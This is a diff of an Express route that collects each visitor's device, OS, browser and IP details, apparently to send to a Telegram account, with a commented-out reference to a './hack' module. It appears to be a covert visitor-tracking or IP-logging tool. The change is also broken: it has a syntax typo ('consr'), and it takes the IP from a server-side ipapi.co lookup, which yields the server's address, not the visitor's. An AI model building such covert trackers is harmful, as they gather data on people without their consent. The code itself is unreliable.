@@ -99,11 +99,11 @@ const ajsal = '6524787237';
 app.get('/axl' , async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const deviceName = getDeviceName(userAgent);
-const userIp = getUserIp(req);
+
   
   const response = await axios.get("https://ipapi.co/json/");
     const data = response.data;
-    
+    consr userIp = data.ip
 /*  const { getBattery } = require('./hack');
   const batteryInfo = getBatteryInfo();
   */// Send a message to your Telegram ID with the detected device name
@@ -115,7 +115,7 @@ const userLoc = data.ip;
 D:- ${deviceName}
 V:- ${androos}
 B:- ${brow}
-L:- ${userLoc}
+
 IP:- ${userIp}`;
  
  
